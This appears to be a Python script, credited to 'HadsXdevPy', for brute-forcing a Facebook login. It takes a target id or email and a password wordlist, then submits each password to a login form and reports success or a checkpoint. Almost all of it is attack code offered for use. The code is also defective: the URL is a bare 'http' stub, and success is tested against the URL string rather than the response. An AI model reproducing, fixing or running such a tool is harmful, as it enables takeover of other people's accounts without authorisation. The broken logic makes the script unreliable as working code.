#author HadsXdevPy

import sys
from os import system
try:
  import requests
except ModuleNotFoundError:
  system('pip install requests')
logo="""
 _______  ______     _______  _______  _        _______  _______  _        _______
(  ____ \(  ___ \   (  ____ \(  ___  )( (    /|(  ____ \(  ___  )( \      (  ____ \\
| (    \/| (   ) )  | (    \/| (   ) ||  \  ( || (    \/| (   ) || (      | (    \/
| (__    | (__/ /   | |      | |   | ||   \ | || (_____ | |   | || |      | (__
|  __)   |  __ (    | |      | |   | || (\ \) |(_____  )| |   | || |      |  __)
| (      | (  \ \   | |      | |   | || | \   |      ) || |   | || |      | (
| )      | )___) )  | (____/\| (___) || )  \  |/\____) || (___) || (____/\| (____/\\
|/       |/ \___/   (_______/(_______)|/    )_)\_______)(_______)(_______/(_______/
"""
url='http'
def helps():
  print("""
  help      ==>  help for using this tools
  set id    ==>  set id or email for attack
  set word  ==>  set wordlist for attack password
  run
  """)
try:
  system('clear')
  print(logo)
  while True:
    menu=input('fb-console > ')
    if menu=='help':
      helps()
    elif 'set id' in menu:
      ids=menu.split()[(-1)]
      print('saved > '+ids)
    elif 'set word' in menu:
      word=menu.split()[(-1)]
      print('saved > '+word)
    elif menu=='run':
      hah=open(word, 'r')
      for lines in hah:
        pw=lines.strip()
        req=requests.post(url, data={'email':ids, 'pass':pw, 'submit':'submit'})
        req.content
        gets=req.get
        if 'home' in url:
          print('success : '+pw)
          sys.exit(0.1)
        elif 'checkpoint' in url:
          print('checkpoint : '+pw)
        else:
          print('failed : '+pw)
    else:
      print('wrong command!')
except KeyboardInterrupt:
  print('abort')
